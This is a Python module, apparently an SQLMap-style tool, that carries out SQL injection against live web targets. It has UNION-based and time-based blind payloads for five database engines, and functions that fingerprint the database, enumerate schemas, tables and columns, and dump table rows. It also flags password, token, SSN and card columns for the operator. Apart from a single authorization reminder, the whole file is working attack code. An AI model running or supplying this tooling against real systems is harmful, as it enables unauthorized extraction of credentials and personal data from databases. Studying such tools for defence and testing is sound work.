"""
Database Extraction Module (SQLMap-style)
Tests for SQL injection and extracts database information
IMPORTANT: Use only on systems you are authorized to test
"""
import re
import time
import urllib.parse
import random
import string

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Database detection queries
DB_DETECTION_QUERIES = {
    "MySQL": {
        "detect": ["' AND 1=CONVERT(int,@@version)--", "' AND EXTRACTVALUE(1,@@version)--"],
        "version": "' UNION SELECT @@version,NULL--",
        "databases": "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR ','),NULL FROM information_schema.schemata--",
        "tables": "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),NULL FROM information_schema.tables WHERE table_schema=database()--",
        "columns": "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ','),NULL FROM information_schema.columns WHERE table_name='{table}'--",
        "dump": "' UNION SELECT GROUP_CONCAT({cols} SEPARATOR '|'),NULL FROM {table} LIMIT 10--",
        "current_db": "' UNION SELECT database(),NULL--",
        "current_user": "' UNION SELECT user(),NULL--",
        "hostname": "' UNION SELECT @@hostname,NULL--",
        "datadir": "' UNION SELECT @@datadir,NULL--",
        "error_patterns": [r"You have an error in your SQL syntax", r"Warning.*mysql_", r"MySQL Query fail"]
    },
    "PostgreSQL": {
        "version": "' UNION SELECT version(),NULL--",
        "databases": "' UNION SELECT string_agg(datname,','),NULL FROM pg_database--",
        "tables": "' UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--",
        "columns": "' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='{table}'--",
        "current_db": "' UNION SELECT current_database(),NULL--",
        "current_user": "' UNION SELECT current_user,NULL--",
        "error_patterns": [r"PostgreSQL.*ERROR", r"Warning.*pg_", r"org\.postgresql"]
    },
    "MSSQL": {
        "version": "' UNION SELECT @@version,NULL--",
        "databases": "' UNION SELECT name,NULL FROM master..sysdatabases--",
        "tables": "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
        "columns": "' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('{table}')--",
        "current_db": "' UNION SELECT DB_NAME(),NULL--",
        "current_user": "' UNION SELECT SYSTEM_USER,NULL--",
        "error_patterns": [r"Microsoft.*SQL.*Server", r"Unclosed quotation mark", r"ODBC.*SQL Server"]
    },
    "Oracle": {
        "version": "' UNION SELECT banner,NULL FROM v$version--",
        "tables": "' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM<=20--",
        "current_user": "' UNION SELECT user,NULL FROM DUAL--",
        "error_patterns": [r"ORA-\d{4,5}", r"Oracle.*error", r"Warning.*oci_"]
    },
    "SQLite": {
        "version": "' UNION SELECT sqlite_version(),NULL--",
        "tables": "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
        "columns": "' UNION SELECT sql,NULL FROM sqlite_master WHERE name='{table}'--",
        "error_patterns": [r"SQLite.*error", r"near.*syntax error", r"SQLITE_ERROR"]
    }
}

# Time-based blind injection
TIME_BASED_PAYLOADS = {
    "MySQL": "' AND SLEEP(3)--",
    "PostgreSQL": "'; SELECT pg_sleep(3)--",
    "MSSQL": "'; WAITFOR DELAY '0:0:3'--",
    "Oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    "Generic": "' OR SLEEP(3)--",
}

BOOLEAN_PAYLOADS = {
    "true": "' AND 1=1--",
    "false": "' AND 1=2--",
}


def _make_request(session, url, params=None, data=None, method="GET", timeout=15):
    """Make HTTP request with error handling"""
    try:
        if method == "GET":
            return session.get(url, params=params, timeout=timeout, verify=False, allow_redirects=True)
        else:
            return session.post(url, data=data, timeout=timeout, verify=False, allow_redirects=True)
    except requests.Timeout:
        return None
    except Exception:
        return None


def detect_db_type(url, param, callback=None):
    """Detect database type based on error messages"""
    if not HAS_REQUESTS:
        return None

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    if callback:
        callback({"type": "info", "message": "🔍 Detecting database type..."})

    for payload in ["'", "\"", "''", "' --", "\" --"]:
        test_params = params.copy()
        test_params[param] = test_params.get(param, "1") + payload

        resp = _make_request(session, base_url, params=test_params)
        if not resp:
            continue

        for db_type, db_info in DB_DETECTION_QUERIES.items():
            for pattern in db_info.get("error_patterns", []):
                if re.search(pattern, resp.text, re.IGNORECASE):
                    if callback:
                        callback({"type": "found", "message": f"🗄️  Database detected: {db_type}"})
                    return db_type

    return None


def extract_union_data(session, base_url, params, param, payload, callback=None):
    """Extract data using UNION-based injection"""
    test_params = params.copy()
    # Set original param to 0 to ensure our UNION result is returned
    test_params[param] = "0"
    full_payload = "0" + payload
    test_params[param] = full_payload

    resp = _make_request(session, base_url, params=test_params)
    if not resp:
        return None

    # Look for extracted data between markers
    match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text, re.DOTALL)
    if match:
        return match.group(1).strip()

    return resp.text


def get_db_info(url, param, db_type=None, callback=None):
    """Get database version, current db, current user"""
    if not HAS_REQUESTS:
        return {"error": "requests library not available"}

    if callback:
        callback({"type": "info", "message": f"📊 Extracting database info from {url}..."})

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    results = {
        "url": url,
        "param": param,
        "db_type": db_type,
        "version": None,
        "current_db": None,
        "current_user": None,
        "hostname": None,
        "databases": [],
        "tables": [],
        "columns": {},
        "data": {}
    }

    # Auto-detect DB type if not provided
    if not db_type:
        db_type = detect_db_type(url, param, callback)
        if not db_type:
            db_type = "MySQL"  # Default to MySQL
        results["db_type"] = db_type

    db_queries = DB_DETECTION_QUERIES.get(db_type, DB_DETECTION_QUERIES["MySQL"])

    # Detect number of columns first (needed for UNION)
    num_columns = _detect_columns(session, base_url, params, param, callback)
    if callback:
        callback({"type": "info", "message": f"  📐 Detected {num_columns} columns in result set"})

    # Build UNION SELECT with correct number of NULLs
    def build_union(select_col, num_cols=num_columns):
        nulls = ["NULL"] * max(num_cols, 2)
        nulls[0] = f"CONCAT('SQLI_START',{select_col},'SQLI_END')" if db_type in ["MySQL", "SQLite"] else \
                   f"'SQLI_START'||{select_col}||'SQLI_END'" if db_type in ["PostgreSQL", "Oracle", "SQLite"] else \
                   f"'SQLI_START'+CAST({select_col} AS VARCHAR)+'SQLI_END'"
        return f"' UNION SELECT {','.join(nulls)}--"

    # Extract version
    version_queries = {
        "MySQL": "@@version", "PostgreSQL": "version()", "MSSQL": "@@version",
        "Oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)", "SQLite": "sqlite_version()"
    }
    try:
        version_q = version_queries.get(db_type, "@@version")
        payload = build_union(version_q)
        test_p = params.copy()
        test_p[param] = "0" + payload
        resp = _make_request(session, base_url, params=test_p)
        if resp:
            match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
            if match:
                results["version"] = match.group(1).strip()
                if callback:
                    callback({"type": "found", "message": f"🗃️  DB Version: {results['version'][:100]}"})
    except Exception as e:
        pass

    # Extract current database
    current_db_queries = {
        "MySQL": "database()", "PostgreSQL": "current_database()",
        "MSSQL": "DB_NAME()", "Oracle": "(SELECT ora_database_name FROM DUAL)", "SQLite": "'main'"
    }
    try:
        db_q = current_db_queries.get(db_type, "database()")
        payload = build_union(db_q)
        test_p = params.copy()
        test_p[param] = "0" + payload
        resp = _make_request(session, base_url, params=test_p)
        if resp:
            match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
            if match:
                results["current_db"] = match.group(1).strip()
                if callback:
                    callback({"type": "found", "message": f"🗃️  Current DB: {results['current_db']}"})
    except Exception:
        pass

    # Extract current user
    user_queries = {
        "MySQL": "user()", "PostgreSQL": "current_user",
        "MSSQL": "SYSTEM_USER", "Oracle": "USER", "SQLite": "'sqlite_user'"
    }
    try:
        user_q = user_queries.get(db_type, "user()")
        payload = build_union(user_q)
        test_p = params.copy()
        test_p[param] = "0" + payload
        resp = _make_request(session, base_url, params=test_p)
        if resp:
            match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
            if match:
                results["current_user"] = match.group(1).strip()
                if callback:
                    callback({"type": "found", "message": f"👤 DB User: {results['current_user']}"})
    except Exception:
        pass

    # Extract hostname (MySQL only)
    if db_type == "MySQL":
        try:
            payload = build_union("@@hostname")
            test_p = params.copy()
            test_p[param] = "0" + payload
            resp = _make_request(session, base_url, params=test_p)
            if resp:
                match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
                if match:
                    results["hostname"] = match.group(1).strip()
                    if callback:
                        callback({"type": "found", "message": f"🖥️  Hostname: {results['hostname']}"})
        except Exception:
            pass

    return results


def get_databases(url, param, db_type=None, num_columns=2, callback=None):
    """Extract list of databases"""
    if not HAS_REQUESTS:
        return []

    if callback:
        callback({"type": "info", "message": "📂 Extracting database list..."})

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    databases = []

    if not db_type:
        db_type = detect_db_type(url, param, callback) or "MySQL"

    num_cols = _detect_columns(session, base_url, params, param)

    db_queries = {
        "MySQL": "GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR ',')",
        "MySQL_from": "information_schema.schemata",
        "PostgreSQL": "string_agg(datname,',')",
        "PostgreSQL_from": "pg_database",
        "MSSQL": "stuff((select ',' + name from master..sysdatabases for xml path('')),1,1,'')",
        "MSSQL_from": "(SELECT 1) AS t",
    }

    nulls = ["NULL"] * max(num_cols, 2)

    if db_type == "MySQL":
        select_expr = "GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR ',')"
        from_clause = "information_schema.schemata"
        concat_fn = lambda x: f"CONCAT('SQLI_START',{x},'SQLI_END')"
    elif db_type == "PostgreSQL":
        select_expr = "string_agg(datname,',')"
        from_clause = "pg_database"
        concat_fn = lambda x: f"'SQLI_START'||{x}||'SQLI_END'"
    else:
        select_expr = "GROUP_CONCAT(schema_name)"
        from_clause = "information_schema.schemata"
        concat_fn = lambda x: f"CONCAT('SQLI_START',{x},'SQLI_END')"

    nulls[0] = concat_fn(select_expr)
    payload = f"' UNION SELECT {','.join(nulls)} FROM {from_clause}--"

    test_p = params.copy()
    test_p[param] = "0" + payload
    resp = _make_request(session, base_url, params=test_p)

    if resp:
        match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
        if match:
            dbs_str = match.group(1).strip()
            databases = [d.strip() for d in dbs_str.split(',') if d.strip()]
            if callback:
                for db in databases:
                    callback({"type": "found", "message": f"📁 Database: {db}"})

    return databases


def get_tables(url, param, database=None, db_type=None, num_columns=2, callback=None):
    """Extract tables from a database"""
    if not HAS_REQUESTS:
        return []

    if callback:
        db_str = f"database: {database}" if database else "current database"
        callback({"type": "info", "message": f"📋 Extracting tables from {db_str}..."})

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    if not db_type:
        db_type = detect_db_type(url, param) or "MySQL"

    num_cols = _detect_columns(session, base_url, params, param) or num_columns
    nulls = ["NULL"] * max(num_cols, 2)

    if db_type == "MySQL":
        db_filter = f"WHERE table_schema='{database}'" if database else "WHERE table_schema=database()"
        select_expr = f"GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
        payload = f"' UNION SELECT CONCAT('SQLI_START',{select_expr},'SQLI_END'),{','.join(['NULL']*(max(num_cols,2)-1))} FROM information_schema.tables {db_filter}--"
    elif db_type == "PostgreSQL":
        select_expr = "string_agg(tablename,',')"
        payload = f"' UNION SELECT 'SQLI_START'||{select_expr}||'SQLI_END',{','.join(['NULL']*(max(num_cols,2)-1))} FROM pg_tables WHERE schemaname='public'--"
    else:
        select_expr = "GROUP_CONCAT(table_name)"
        db_filter = f"WHERE table_schema='{database}'" if database else "WHERE table_schema=database()"
        payload = f"' UNION SELECT CONCAT('SQLI_START',{select_expr},'SQLI_END'),{','.join(['NULL']*(max(num_cols,2)-1))} FROM information_schema.tables {db_filter}--"

    test_p = params.copy()
    test_p[param] = "0" + payload
    resp = _make_request(session, base_url, params=test_p)

    tables = []
    if resp:
        match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
        if match:
            tables_str = match.group(1).strip()
            tables = [t.strip() for t in tables_str.split(',') if t.strip()]
            if callback:
                for table in tables:
                    # Highlight sensitive tables
                    sensitive = any(s in table.lower() for s in
                                  ["user", "admin", "password", "credential", "secret", "token", "session", "account", "auth"])
                    icon = "🔴" if sensitive else "📋"
                    callback({"type": "found" if not sensitive else "vuln",
                             "message": f"{icon} Table: {table}"})

    return tables


def get_columns(url, param, table, database=None, db_type=None, num_columns=2, callback=None):
    """Extract columns from a table"""
    if not HAS_REQUESTS:
        return []

    if callback:
        callback({"type": "info", "message": f"🔍 Extracting columns from table: {table}..."})

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    if not db_type:
        db_type = detect_db_type(url, param) or "MySQL"

    num_cols = _detect_columns(session, base_url, params, param) or num_columns

    if db_type == "MySQL":
        db_filter = f"AND table_schema='{database}'" if database else ""
        payload = f"' UNION SELECT CONCAT('SQLI_START',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ','),'SQLI_END'),{'NULL,' * (max(num_cols,2)-1)}NULL FROM information_schema.columns WHERE table_name='{table}' {db_filter}--"
    elif db_type == "PostgreSQL":
        payload = f"' UNION SELECT 'SQLI_START'||string_agg(column_name,',')||'SQLI_END',NULL FROM information_schema.columns WHERE table_name='{table}'--"
    elif db_type == "SQLite":
        payload = f"' UNION SELECT 'SQLI_START'||(SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{table}'))||'SQLI_END',NULL--"
    else:
        payload = f"' UNION SELECT CONCAT('SQLI_START',GROUP_CONCAT(column_name),'SQLI_END'),NULL FROM information_schema.columns WHERE table_name='{table}'--"

    test_p = params.copy()
    test_p[param] = "0" + payload
    resp = _make_request(session, base_url, params=test_p)

    columns = []
    if resp:
        match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
        if match:
            cols_str = match.group(1).strip()
            columns = [c.strip() for c in cols_str.split(',') if c.strip()]
            if callback:
                for col in columns:
                    sensitive = any(s in col.lower() for s in
                                  ["pass", "pwd", "secret", "token", "key", "hash", "salt", "credit", "card", "ssn", "email"])
                    icon = "🔑" if sensitive else "📊"
                    callback({"type": col_type(col),
                             "message": f"{icon} Column: {col}"})

    return columns


def col_type(col_name):
    """Determine output type based on column sensitivity"""
    sensitive = any(s in col_name.lower() for s in
                  ["pass", "pwd", "secret", "token", "key", "hash", "salt", "credit", "card", "ssn"])
    return "vuln" if sensitive else "found"


def dump_table(url, param, table, columns, limit=20, database=None, db_type=None, num_columns=2, callback=None):
    """Dump data from a table"""
    if not HAS_REQUESTS:
        return []

    if callback:
        callback({"type": "info", "message": f"⬇️  Dumping data from table: {table} (columns: {', '.join(columns)})..."})

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    if not db_type:
        db_type = detect_db_type(url, param) or "MySQL"

    num_cols = _detect_columns(session, base_url, params, param) or num_columns

    results = []
    separator = "||"

    # Dump rows
    for offset in range(0, min(limit, 100), 1):
        if db_type == "MySQL":
            cols_concat = "CONCAT(" + ",'|',".join([f"IFNULL({c},'NULL')" for c in columns]) + ")"
            payload = f"' UNION SELECT CONCAT('SQLI_START',{cols_concat},'SQLI_END'),{'NULL,' * (max(num_cols,2)-1)}NULL FROM {table} LIMIT 1 OFFSET {offset}--"
        elif db_type == "PostgreSQL":
            cols_concat = "||'|'||".join([f"COALESCE({c}::text,'NULL')" for c in columns])
            payload = f"' UNION SELECT 'SQLI_START'||{cols_concat}||'SQLI_END',NULL FROM {table} LIMIT 1 OFFSET {offset}--"
        else:
            cols_concat = "CONCAT(" + ",'|',".join([f"IFNULL({c},'NULL')" for c in columns]) + ")"
            payload = f"' UNION SELECT CONCAT('SQLI_START',{cols_concat},'SQLI_END'),NULL FROM {table} LIMIT 1 OFFSET {offset}--"

        test_p = params.copy()
        test_p[param] = "0" + payload
        resp = _make_request(session, base_url, params=test_p)

        if not resp:
            break

        match = re.search(r'SQLI_START(.+?)SQLI_END', resp.text)
        if not match:
            break

        row_data = match.group(1).strip()
        row_values = row_data.split('|')

        row = {col: (val if len(row_values) > i else "N/A") for i, (col, val) in enumerate(zip(columns, row_values))}
        results.append(row)

        if callback:
            row_str = " | ".join([f"{k}: {v}" for k, v in row.items()])
            callback({"type": "found", "message": f"  📝 Row {offset+1}: {row_str[:200]}"})

    if callback:
        callback({"type": "complete", "message": f"✅ Dumped {len(results)} rows from {table}"})

    return results


def _detect_columns(session, base_url, params, param, start=1, max_cols=20):
    """Detect number of columns using ORDER BY technique"""
    original_val = params.get(param, "1")

    for n in range(1, max_cols + 1):
        test_p = params.copy()
        test_p[param] = f"{original_val}' ORDER BY {n}--"
        try:
            resp = session.get(base_url, params=test_p, timeout=8, verify=False)
            if resp and (
                re.search(r'(unknown column|ORDER BY|1054|column.*order)', resp.text, re.IGNORECASE) or
                resp.status_code in [500, 502]
            ):
                return max(n - 1, 2)
        except Exception:
            pass

    return 2  # Default to 2 columns if detection fails


def time_based_blind_extract(url, param, query, db_type="MySQL", callback=None):
    """Extract data character by character using time-based blind injection"""
    if not HAS_REQUESTS:
        return ""

    if callback:
        callback({"type": "info", "message": f"⏱️  Time-based blind extraction (this may take a while)..."})

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    session.verify = False

    parsed = urllib.parse.urlparse(url)
    params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    base_url = url.split('?')[0]

    extracted = ""
    max_length = 50  # Limit extraction length

    for pos in range(1, max_length + 1):
        found_char = False
        for char_code in range(32, 127):  # Printable ASCII
            if db_type == "MySQL":
                payload = f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))={char_code},SLEEP(1),0)--"
            elif db_type == "PostgreSQL":
                payload = f"' AND (SELECT CASE WHEN ASCII(SUBSTRING(({query}),{pos},1))={char_code} THEN pg_sleep(1) ELSE pg_sleep(0) END)--"
            else:
                payload = f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))={char_code},SLEEP(1),0)--"

            test_p = params.copy()
            test_p[param] = test_p.get(param, "1") + payload

            start = time.time()
            resp = _make_request(session, base_url, params=test_p, timeout=5)
            elapsed = time.time() - start

            if elapsed >= 0.9:  # Sleep triggered
                char = chr(char_code)
                extracted += char
                found_char = True
                if callback and pos % 5 == 0:
                    callback({"type": "info", "message": f"  Extracted so far: {extracted}"})
                break

        if not found_char:
            # End of string
            break

    if callback:
        callback({"type": "found", "message": f"⬇️  Extracted: {extracted}"})

    return extracted


def full_db_extraction(url, param, mode="basic", db_type=None, target_table=None,
                      target_columns=None, limit=20, callback=None):
    """
    Full database extraction workflow

    Modes:
    - basic: Get DB info (version, user, hostname)
    - enum: Enumerate databases and tables
    - dump: Dump specific table data
    """
    if callback:
        callback({"type": "info", "message": f"🗄️  Starting database extraction on {url}"})
        callback({"type": "warn", "message": "⚠️  REMINDER: Only use on authorized targets!"})
        callback({"type": "info", "message": f"   Parameter: {param} | Mode: {mode}"})

    results = {
        "url": url,
        "param": param,
        "mode": mode,
        "db_type": db_type
    }

    # Detect DB type
    if not db_type:
        db_type = detect_db_type(url, param, callback) or "MySQL"
        results["db_type"] = db_type

    if mode in ["basic", "enum", "dump"]:
        # Get basic info
        callback({"type": "info", "message": "\n--- Database Info ---"})
        info = get_db_info(url, param, db_type, callback)
        results.update(info)

    if mode in ["enum", "dump"]:
        # Get databases
        callback({"type": "info", "message": "\n--- Available Databases ---"})
        databases = get_databases(url, param, db_type, callback=callback)
        results["databases"] = databases

        # Get tables from current/target database
        callback({"type": "info", "message": f"\n--- Tables ({results.get('current_db', 'current')}) ---"})
        tables = get_tables(url, param, results.get("current_db"), db_type, callback=callback)
        results["tables"] = tables

    if mode == "dump" and target_table:
        # Get columns
        callback({"type": "info", "message": f"\n--- Columns of {target_table} ---"})
        cols = target_columns or get_columns(url, param, target_table, db_type=db_type, callback=callback)
        results["columns"] = {target_table: cols}

        if cols:
            # Dump data
            callback({"type": "info", "message": f"\n--- Data from {target_table} ---"})
            data = dump_table(url, param, target_table, cols, limit, db_type=db_type, callback=callback)
            results["data"] = {target_table: data}

    if callback:
        callback({"type": "complete", "message": "\n✅ Database extraction complete!"})

    return results
